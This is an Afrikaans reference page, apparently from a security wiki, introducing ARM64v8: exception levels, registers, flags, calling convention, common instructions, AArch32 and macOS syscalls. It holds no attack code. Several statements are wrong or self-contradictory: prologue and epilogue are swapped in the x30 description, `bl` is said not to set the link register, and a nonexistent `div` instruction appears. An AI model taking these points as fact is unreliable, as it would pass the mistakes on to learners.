# Introduction to ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

In ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die voorregvlak en vermoëns van die uitvoeringsomgewing. Daar is vier exception-vlakke, van EL0 tot EL3, elk met 'n ander doel:

1. **EL0 - User Mode**:
- Dit is die minste-bevoorregte vlak en word gebruik vir die uitvoering van gewone toepassingkode.
- Toepassings wat by EL0 loop, is van mekaar en van die stelselprogrammatuur geïsoleer, wat sekuriteit en stabiliteit verbeter.
2. **EL1 - Operating System Kernel Mode**:
- Die meeste bedryfstelselkernels hardloop op hierdie vlak.
- EL1 het meer voorregte as EL0 en kan stelselhulpbronne toegang, maar met sekere beperkings om stelselintegriteit te verseker.
3. **EL2 - Hypervisor Mode**:
- Hierdie vlak word vir virtualisering gebruik. 'n Hypervisor wat by EL2 loop kan meerdere bedryfstelsels bestuur (elkeen in sy eie EL1) op dieselfde fisiese hardeware.
- EL2 bied funksies vir isolasie en beheer van die gevirtualiseerde omgewings.
4. **EL3 - Secure Monitor Mode**:
- Dit is die mees bevoorregte vlak en word dikwels gebruik vir secure boot en vertroude uitvoeringsomgewings.
- EL3 kan toegang tussen secure en non-secure state beheer en bestuur (soos secure boot, trusted OS, ens.).

Die gebruik van hierdie vlakke maak 'n gestruktureerde en veilige wyse moontlik om verskillende aspekte van die stelsel te bestuur, van gebruikersprogramme tot die mees bevoorregte stelselprogrammatuur. ARMv8 se benadering tot voorregvlakke help om verskillende stelselkomponente effektief te isoleer en sodoende die sekuriteit en robuustheid van die stelsel te versterk.

## **Registers (ARM64v8)**

ARM64 het **31 general-purpose registers**, gemerk `x0` tot `x30`. Elk kan 'n **64-bit** (8-byt) waarde stoor. Vir operasies wat slegs 32-bit waardes benodig, kan dieselfde registers in 'n 32-bit formaat geraadpleeg word met die name `w0` tot `w30`.

1. **`x0`** tot **`x7`** - Hierdie word tipies gebruik as scratch-registers en vir die deurgee van parameters na subrutines.
- **`x0`** dra ook die terugkeerdata van 'n funksie.
2. **`x8`** - In die Linux-kern word `x8` gebruik as die system call nommer vir die `svc` instruksie. **In macOS die x16 is die een wat gebruik word!**
3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels gebruik vir plaaslike veranderlikes.
4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Tydelike registers vir onmiddellike waardes. Hulle word ook gebruik vir indirekte funksie-oproepe en PLT (Procedure Linkage Table) stubs.
- **`x16`** word gebruik as die **system call number** vir die **`svc`** instruksie in **macOS**.
5. **`x18`** - **Platform register**. Dit kan as 'n general-purpose register gebruik word, maar op sommige platforms is hierdie register gereserveer vir platform-spesifieke gebruike: wysiger na die huidige thread environment block in Windows, of om na die tans **uitvoerende task structure in linux kernel** te wys.
6. **`x19`** tot **`x28`** - Dit is callee-saved registers. 'n Funksie moet die waardes van hierdie registers vir sy caller bewaar, dus word hulle in die stack gestoor en herkry voordat teruggekeer word na die caller.
7. **`x29`** - **Frame pointer** om die stack-raad te hou. Wanneer 'n nuwe stack-frame geskep word omdat 'n funksie aangeroep is, word die **`x29`** register **in die stack gestoor** en die **nuwe** frame pointer adres (die **`sp`** adres) word **in hierdie register** gestoor.
- Hierdie register kan ook as 'n **general-purpose register** gebruik word alhoewel dit gewoonlik as verwysing na **plaatslike veranderlikes** gebruik word.
8. **`x30`** of **`lr`** - **Link register**. Dit hou die **terugkeeradres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`** waarde in hierdie register te stoor.
- Dit kan ook soos enige ander register gebruik word.
- As die huidige funksie 'n nuwe funksie gaan aanroep en dus `lr` oorskryf, sal dit aan die begin in die stack gestoor word—dit is die epiloog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, genereer ruimte en kry nuwe `fp`) en herstel dit aan die einde, dit is die proloog (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
9. **`sp`** - **Stack pointer**, gebruik om die top van die stack te hê.
- Die **`sp`** waarde moet altyd op ten minste 'n **quadword** **uitlyningsvlak** gehou word of 'n uitlyningsfout kan voorkom.
10. **`pc`** - **Program counter**, wat na die volgende instruksie wys. Hierdie register kan slegs bygewerk word deur exception-generasies, exception-terugkeer en takke. Die enigste gewone instruksies wat hierdie register kan lees, is Branch with Link instruksies (BL, BLR) om die **`pc`** adres in **`lr`** (Link Register) te stoor.
11. **`xzr`** - **Zero register**. Ook genoem **`wzr`** in sy **32**-bit register vorm. Kan gebruik word om maklik die nul-waarde te kry (algemene operasie) of om vergelykings uit te voer met **`subs`** soos **`subs XZR, Xn, #10`** en die resultaat nêrens te stoor (in **`xzr`**).

Die **`Wn`** registers is die **32bit** weergawe van die **`Xn`** register.

> [!TIP]
> Die registers van X0 - X18 is vluchtig (volatile), wat beteken hul waardes kan deur funksie-oproepe en interrupts verander word. Die registers van X19 - X28 is egter nie-vlugtig, wat beteken hul waardes moet oor funksie-oproepe bewaar bly ("callee saved").

### SIMD and Floating-Point Registers

Bo en behalwe is daar nog **32 registers van 128bit lengte** wat in geoptimaliseerde single instruction multiple data (SIMD) operasies en vir dryfpunt-aritmetika gebruik kan word. Hierdie word die Vn registers genoem alhoewel hulle ook in **64**-bit, **32**-bit, **16**-bit en **8**-bit opereer en dan **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem word.

### System Registers

**Daar is honderde system registers**, ook genoem special-purpose registers (SPRs), wat gebruik word vir **monitoring** en **beheering** van die **verhouding van verwerkers**.\
Hulle kan slegs gelees of gestel word met behulp van die toegewyde spesiale instruksies **`mrs`** en **`msr`**.

Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** kom algemeen voor tydens reverse engineering. Die `EL0` agtervoegsel dui die **minimale exception** aan waarvan die register toeganklik is (in hierdie geval is EL0 die gewone exception (voorreg) vlak waarop gewone programme hardloop).\
Hul word dikwels gebruik om die **basisadres van die thread-local storage** geheuegebied te stoor. Gewoonlik is die eerste een lees- en skryfbaar vir programme wat by EL0 loop, maar die tweede kan van EL0 gelees en van EL1 geskryf word (soos die kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie proseskomponente geserialiseer in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register, waar X die **permitvlak** van die getriggerde exception is (dit laat toe om die prosesstaat te herstel wanneer die exception eindig).\
Hierdie is die toeganklike veldjies:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** en **`V`** conditievlae:
- **`N`** beteken die operasie het 'n negatiewe resultaat gegee
- **`Z`** beteken die operasie het nul gegee
- **`C`** beteken die operasie het 'n carry gehad
- **`V`** beteken die operasie het 'n signed overflow gegee:
- Die som van twee positiewe getalle gee 'n negatiewe resultaat.
- Die som van twee negatiewe getalle gee 'n positiewe resultaat.
- In aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of omgekeerd), en die resultaat nie binne die reeks van die gegewe bits getoon kan word nie.
- Oenklik die verwerker weet nie of die operasie signed is of nie, so dit sal C en V in die operasies nagaan en aandui of 'n carry plaasgevind het in die geval dit signed of unsigned was.

> [!WARNING]
> Nie al die instruksies werk hierdie vlae by nie. Sommige soos **`CMP`** of **`TST`** doen dit, en ander wat 'n `s` agtervoegsel het soos **`ADDS`** doen dit ook.

- Die huidige **register breedte (`nRW`) vlag**: As die vlag die waarde 0 hou, sal die program in die AArch64 uitvoeringsstaat loop sodra hervat.
- Die huidige **Exception Level** (**`EL`**): 'n Gewone program wat in EL0 loop sal die waarde 0 hê.
- Die **single stepping** vlag (**`SS`**): Word deur debuggers gebruik om enkelstap deur te voer deur die SS vlag op 1 te stel binne **`SPSR_ELx`** deur 'n exception. Die program sal 'n stap uitvoer en 'n single step exception uitreik.
- Die **illegal exception** status vlag (**`IL`**): Dit word gebruik om te merk wanneer 'n bevoorregte sagteware 'n ongeldige exception level-oordrag uitvoer; hierdie vlag word op 1 gestel en die verwerker trigger 'n illegal state exception.
- Die **`DAIF`** vlae: Hierdie vlae laat 'n bevoorregte program toe om sekere eksterne exceptions selektief te mask.
- As **`A`** 1 is beteken dit **asynchronous aborts** sal getrigger word. Die **`I`** konfigureer om op eksterne hardeware **Interrupt Requests** (IRQs) te reageer. En die **`F`** is verwant aan **Fast Interrupt Requests** (FIRs).
- Die **stack pointer select** vlae (**`SPS`**): Bevoorregte programme wat in EL1 en hoër loop kan skakel tussen die gebruik van hul eie stack pointer register en die gebruiker-model een (bv. tussen `SP_EL1` en `EL0`). Hierdie omskakeling word uitgevoer deur na die **`SPSel`** spesiale register te skryf. Dit kan nie vanaf EL0 gedoen word nie.

## **Calling Convention (ARM64v8)**

Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** aan 'n funksie in registers **`x0`** tot **`x7`** gedra word. **Addisionele** parameters word op die **stack** deurgegee. Die **terugkeer** waarde word in register **`x0`** teruggegee, of ook in **`x1`** as dit 128 bits lank is. Die **`x19`** tot **`x30`** en **`sp`** registers moet **behou** word oor funksie-oproepe.

Wanneer jy 'n funksie in assembler lees, kyk vir die **funksie proloog en epiloog**. Die **proloog** behels gewoonlik **om die frame pointer (`x29`) te stoor**, **op te stel** 'n **nuwe frame pointer**, en **stack-ruimte te toeken**. Die **epiloog** behels gewoonlik **herstel van die gestoor frame pointer** en **terugkeer** uit die funksie.

### Calling Convention in Swift

Swift het sy eie **calling convention** wat gevind kan word by [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64-instruksies het oor die algemeen die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **operasie** is wat uitgevoer word (soos `add`, `sub`, `mov`, ens.), **`dst`** is die **bestemming** register waar die resultaat gestoor sal word, en **`src1`** en **`src2`** is die **bronne** registers. Immediate waardes kan ook in plek van bronregisters gebruik word.

- **`mov`**: **Move** 'n waarde van een **register** na 'n ander.
- Voorbeeld: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
- **`ldr`**: **Load** 'n waarde uit **geheue** in 'n **register**.
- Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde van die geheue-ligging wat deur `x1` aangedui word in `x0`.
- **Offset mode**: 'n Offset wat die oorsprong-aanwyser affekteer word aangedui, byvoorbeeld:
- `ldr x2, [x1, #8]`, dit sal in x2 die waarde van x1 + 8 laai
- `ldr x2, [x0, x1, lsl #2]`, dit sal in x2 'n objek uit die array x0 laai, van posisie x1 (indeks) * 4
- **Pre-indexed mode**: Dit sal berekeninge op die oorsprong toepas, die resultaat kry en ook die nuwe oorsprong in die oorsprong stoor.
- `ldr x2, [x1, #8]!`, dit sal `x1 + 8` in `x2` laai en in x1 die resultaat van `x1 + 8` stoor
- `str lr, [sp, #-4]!`, Stoor die link register in sp en werk die register sp op
- **Post-index mode**: Dit is soos die vorige, maar die geheueadres word eerstens geraadpleeg en dan word die offset bereken en gestoor.
- `ldr x0, [x1], #8`, laai `x1` in `x0` en werk x1 op met `x1 + 8`
- **PC-relative addressing**: In hierdie geval word die adres wat gelaai moet word relatief tot die PC-register bereken
- `ldr x1, =_start`, Dit sal die adres waar die `_start` simbool begin in x1 laai verwant aan die huidige PC.
- **`str`**: **Store** 'n waarde van 'n **register** in **geheue**.
- Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die geheue-ligging aangedui deur `x1`.
- **`ldp`**: **Load Pair of Registers**. Hierdie instruksie **laai twee registers** van **aaneenliggende geheue** liggings. Die geheueadres word tipies gevorm deur 'n offset by die waarde in 'n ander register op te tel.
- Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` van die geheue-liggings by `x2` en `x2 + 8`, onderskeidelik.
- **`stp`**: **Store Pair of Registers**. Hierdie instruksie **stoor twee registers** na **aaneenliggende geheue** liggings. Die geheueadres word tipies gevorm deur 'n offset by die waarde in 'n ander register op te tel.
- Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` in die geheue-liggings by `sp` en `sp + 8`, onderskeidelik.
- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` in die geheue-liggings by `sp+16` en `sp + 24`, onderskeidelik, en werk `sp` by na `sp+16`.
- **`add`**: **Voeg** die waardes van twee registers by en stoor die resultaat in 'n register.
- Sintaks: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Bestemming
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register of immediate)
- \[shift #N | RRX] -> Voer 'n skuif uit of gebruik RRX
- Voorbeeld: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (1 geskuiwe 12 keer) -> 1 0000 0000 0000 0000
- **`adds`** Dit voer 'n `add` uit en werk die vlae by
- **`sub`**: **Trek af** die waardes van twee registers en stoor die resultaat in 'n register.
- Kyk **`add`** **sintaks**.
- Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
- **`subs`** Dit is soos `sub` maar werk die vlae by
- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
- Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
- **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
- Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Voeg 0's by aan die einde en skuif die ander bite vorentoe (vermenigvuldig met 2^n)
- **Logical shift right**: Voeg 0's aan die begin (vir unsigned) en skuif die ander bite agtertoe (deel deur 2^n vir unsigned)
- **Arithmetic shift right**: Soos **`lsr`**, maar as die hoogste bit 'n 1 is, word 1's bygevoeg (deel deur 2^n vir signed)
- **Rotate right**: Soos **`lsr`** maar wat uit die regterkant verwyder word word links aangeheg
- **Rotate Right with Extend**: Soos **`ror`**, maar met die carry vlag as die "mees-belangrike bit". Dus word die carry vlag na bit 31 beweeg en die verwyderde bit na die carry vlag.
- **`bfm`**: **Bit Field Move**, hierdie operasies **kopieer bite `0...n`** van 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **rotate right hoeveelheid**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopieer 'n bitveld uit 'n register en plaas dit in 'n ander register.
- **`BFI X1, X2, #3, #4`** Sit 4 bite van X2 in vanaf die 3de bit van X1
- **`BFXIL X1, X2, #3, #4`** Trek 4 bite uit vanaf die 3de bit van X2 en kopieer hulle na X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bite van X2 en plaas dit in X1 beginnende by bitposisie 3 en maak die regterbite nul
- **`SBFX X1, X2, #3, #4`** Trek 4 bite beginnende by bit 3 van X2 uit, sign-extend dit, en plaas die resultaat in X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bite van X2 en plaas dit in X1 beginnende by bitposisie 3 en maak die regterbite nul
- **`UBFX X1, X2, #3, #4`** Trek 4 bite beginnende by bit 3 van X2 uit en plaas die zero-extended resultaat in X1.
- **Sign Extend To X:** Brei die teken uit (of voeg net 0s by in die unsigned weergawe) van 'n waarde om operasies met dit te kan uitvoer:
- **`SXTB X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64 bits te vul
- **`SXTH X1, W2`** Brei die teken van 'n 16-bit getal **van W2 na X1** uit om die 64 bits te vul
- **`SXTW X1, W2`** Brei die teken van 'n 32-bit getal **van W2 na X1** uit om die 64 bits te vul
- **`UXTB X1, W2`** Voeg 0s by (unsigned) aan 'n byte **van W2 na X1** om die 64 bits te vul
- **`extr`:** Trek bite uit 'n gespesifiseerde **paar van registre concatenated**.
- Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2** concateneer en kry **van bit 3 van W2 tot bit 3 van W1** en dit in W3 stoor.
- **`cmp`**: **Vergelyk** twee registers en stel conditievlae. Dit is 'n **alias van `subs`** wat die bestemming register op die zero register stel. Nuttig om te weet of `m == n`.
- Dit ondersteun dieselfde sintaks as `subs`
- Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die conditievlae ooreenkomstig.
- **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dieselfde sintaks. Nuttig om te weet of `m == -n`.
- **`ccmp`**: Voorwaardelike vergelyking, dit is 'n vergelyking wat slegs uitgevoer sal word as 'n vorige vergelyking waar was en sal spesifiek nzcv-bits stel.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
- Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` 'n `NE`** was; as dit nie was nie sal die bits `nzcv` op 0 gestel word (wat nie die `blt` vergelyking sal bevredig nie).
- Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` vs `cmn`).
- **`tst`**: Dit kontroleer of enige van die bisse van die vergelyking albei 1 is (dit werk soos 'n ANDS sonder om die resultaat enige plek te stoor). Dit is nuttig om 'n register met 'n waarde te toets en te kyk of enige van die bisse wat aangedui word deur die waarde 1 is.
- Voorbeeld: `tst X1, #7` Kontroleer of enige van die laaste 3 bite van X1 1 is
- **`teq`**: XOR-operasie wat die resultaat weggooi
- **`b`**: Onvoorwaardelike Tak (Branch)
- Voorbeeld: `b myFunction`
- Let daarop dat dit nie die link register met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat terug moet keer nie)
- **`bl`**: **Branch** met link, gebruik om 'n **subrutine** te **bel**. Stoor die **terugkeeradres in `x30`**.
- Voorbeeld: `bl myFunction` — Dit roep die funksie `myFunction` aan en stoor die terugkeeradres in `x30`.
- Let dat dit nie die link register met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat terug moet keer nie)
- **`blr`**: **Branch** met Link na Register, gebruik om 'n **subrutine** te **bel** waar die teiken in 'n **register** gespesifiseer is. Stoor die terugkeeradres in `x30`.
- Voorbeeld: `blr x1` — Dit roep die funksie aan wie se adres in `x1` is en stoor die terugkeeradres in `x30`.
- **`ret`**: **Keer terug** van 'n **subrutine**, tipies die adres in **`x30`** gebruik.
- Voorbeeld: `ret` — Dit keer terug uit die huidige subrutine gebruikende die terugkeeradres in `x30`.
- **`b.<cond>`**: Voorwaardelike takke
- **`b.eq`**: **Tak indien gelyk**, gebaseer op die vorige `cmp` instruksie.
- Voorbeeld: `b.eq label` — As die vorige `cmp` twee gelyke waardes gevind het, spring dit na `label`.
- **`b.ne`**: **Tak as nie-gelyk**. Hierdie instruksie kontroleer die conditievlae (gestel deur 'n vorige vergelykingsinstruksie), en as die vergelykte waardes nie gelyk was nie, tak dit na 'n label of adres.
- Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Hierdie instruksie vergelyk 'n register met nul, en as hulle gelyk is, tak dit na 'n label of adres.
- Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Hierdie instruksie vergelyk 'n register met nul, en as hulle nie gelyk is nie, tak dit na 'n label of adres.
- Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie nul is nie, spring dit na `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Voorbeeld: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Voorbeeld: `tbz x0, #8, label`
- **Conditional select operations**: Dit is operasies wie se gedrag afhang van die kondisionele bisse.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1, as onwaar, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as onwaar, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1, as onwaar, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as onwaar, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn), as onwaar, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as onwaar, Xd = - Xm
- `cneg Xd, Xn, cond` -> As waar, Xd = - Xn, as onwaar, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1, as onwaar, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<all 1>, as onwaar, Xd = 0
- **`adrp`**: Bereken die **bladsyadres van 'n simbool** en stoor dit in 'n register.
- Voorbeeld: `adrp x0, symbol` — Dit bereken die bladsyadres van `symbol` en stoor dit in `x0`.
- **`ldrsw`**: **Laai** 'n signed **32-bit** waarde uit geheue en **sign-extend** dit na 64 bits.
- Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n signed 32-bit waarde vanaf die geheue-ligging aangedui deur `x1`, sign-extend dit na 64 bits, en stoor dit in `x0`.
- **`stur`**: **Stoor 'n registerwaarde in 'n geheue-ligging**, gebruik 'n offset van 'n ander register.
- Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue-adres wat 4 bytes groter is as die adres in `x1`.
- **`svc`** : Maak 'n **system call**. Dit staan vir "Supervisor Call". Wanneer die verwerker hierdie instruksie uitvoer, skakel dit **van gebruiker-modus na kern-modus** en spring na 'n spesifieke ligging in geheue waar die **kernel se system call handling** kode geleë is.

- Voorbeeld:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Stoor die link register en frame pointer in die stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Stel die nuwe raamwyser op**: `mov x29, sp` (stel die nuwe raamwyser vir die huidige funksie op)
3. **Ken ruimte op die stapel toe vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal bytes is wat benodig word)

### **Funksie-epiloog**

1. **Maak plaaslike veranderlikes vry (indien enige toegeken is)**: `add sp, sp, <size>`
2. **Herstel die linkregister en raamwyser**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Terugkeer**: `ret` (hergee beheer aan die aanroeper met behulp van die adres in die link register)

## AARCH32 Uitvoeringstoestand

Armv8-A ondersteun die uitvoering van 32-bit programme. **AArch32** kan in een van **twee instruksiesstelle** loop: **`A32`** en **`T32`** en kan tussen hulle wissel via **`interworking`**.\
**Bevoorregte** 64-bit programme kan die **uitvoering van 32-bit** programme beplan deur 'n oordrag van uitsonderingsvlak na die laer-bevoorregte 32-bit uit te voer.\
Neem kennis dat die oorgang van 64-bit na 32-bit plaasvind met 'n laer uitsonderingsvlak (byvoorbeeld 'n 64-bit program in EL1 wat 'n program in EL0 trigger). Dit word gedoen deur **bit 4 van** **`SPSR_ELx`** spesiale register **op 1 te stel** wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word en die res van `SPSR_ELx` die **`AArch32`** program se CPSR stoor. Daarna roep die bevoorregte proses die **`ERET`** instruksie sodat die verwerker na **`AArch32`** oorgaan en A32 of T32 betree afhangende van CPSR**.**

Die **`interworking`** gebeur deur die J en T-bitte van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit beteken basies om die **laagste bit op 1 te stel** om aan te dui dat die instruksie-stel T32 is.\
Dit word gestel tydens die **interworking branch instructions,** maar kan ook direk met ander instruksies gestel word wanneer die PC as die bestemmingsregister gestel word. Voorbeeld:

Nog 'n voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bit registers (r0-r15). **Vanaf r0 tot r14** kan hulle vir **enige operasie** gebruik word, maar sommige word gewoonlik gereserveer:

- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32 huidige + 4.
- **`r11`**: Raamwyser
- **`r12`**: Intra-prosedurele oproepregister
- **`r13`**: Stack Pointer (Let daarop dat die stack altyd 16-byte uitgelyn is)
- **`r14`**: Link Register

Verder word registers gesteun in **`banked registries`**. Dit is plekke wat die registerwaardes stoor en toelaat om **vinnige kontekswisseling** uit te voer tydens uitsonderingshantering en bevoegde operasies, sodat dit nie nodig is om registre elke keer handmatig te stoor en te herstel nie.\
Dit gebeur deur **die verwerkerstatus van die `CPSR` na die `SPSR`** van die verwerkermodus waarin die uitsondering geneem is, te stoor. By die terugkeer van die uitsondering word die **`CPSR`** uit die **`SPSR`** herstel.

### CPSR - Huidige Programstatusregister

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook in **`SPSR_ELx`** gestoor wanneer 'n uitsondering geneem word om later die uitvoering te herstel:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde is in 'n paar groepe verdeeld:

- Application Program Status Register (APSR): Aritmetiese vlagte en toeganglik vanaf EL0
- Execution State Registers: Prosesgedrag (bestuur deur die OS).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** vlagte (soos in AArch64)
- Die **`Q`** vlag: Dit word op 1 gestel wanneer **integer-saturasie** voorkom tydens die uitvoering van 'n spesialis-saturerende aritmetiese instruksie. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Daar is verder geen instruksie wat sy waarde implisiet nagaan nie; dit moet handmatig gelees word.
- **`GE`** (Greater than or equal) vlagte: Dit word in SIMD (Single Instruction, Multiple Data) operasies gebruik, soos "parallel add" en "parallel subtract". Hierdie operasies laat toe om verskeie datapunte in een instruksie te verwerk.

Byvoorbeeld, die **`UADD8`** instruksie **voeg vier pare bytes** (van twee 32-bit operands) parallel by en berg die resultate in 'n 32-bit register. Dit stel dan die **`GE`** vlagte in die **`APSR`** gebaseer op hierdie resultate. Elke GE-vlag stem ooreen met een van die byte-byvoegings en dui aan of die byvoeging vir daardie bytepaar **oorvloei**.

Die **`SEL`** instruksie gebruik hierdie GE-vlagte om voorwaardelike aksies uit te voer.

#### Execution State Registers

- Die **`J`** en **`T`** bits: **`J`** behoort 0 te wees en as **`T`** 0 is gebruik dit die instruksieset A32, en as dit 1 is word T32 gebruik.
- IT Block State Register (`ITSTATE`): Dit is die bisse van 10-15 en 25-26. Hulle stoor toestande vir instruksies binne 'n **`IT`**-voorgestelde groep.
- **`E`** bit: Dui die **endianness** aan.
- Mode en Exception Mask Bits (0-4): Hulle bepaal die huidige uitvoeringstoestand. Die 5de bit dui aan of die program as 32bit (1) of 64bit (0) loop. Die ander 4 verteenwoordig die **uitsonderingsmodus wat tans gebruik word** (wanneer 'n uitsondering plaasvind en hanteer word). Die gesette nommer dui die huidige prioriteit aan ingeval nog 'n uitsondering geaktiveer word terwyl hierdie een hanteer word.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Sekere uitsonderings kan gedeaktiveer word deur die bits **`A`**, `I`, `F`. As **`A`** 1 is beteken dit asynchrone aborts sal geaktiveer word. Die **`I`** stel die reaksie op eksterne hardeware Interrupt Requests (IRQs) op, en die F is verwant aan Fast Interrupt Requests (FIRs).

## macOS

### BSD syscalls

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) of voer `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` uit. BSD syscalls sal **x16 > 0** hê.

### Mach Traps

Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, so jy moet die nommers van die vorige lys met 'n **minus** oproep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om te vind hoe om hierdie (en BSD) syscalls aan te roep:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
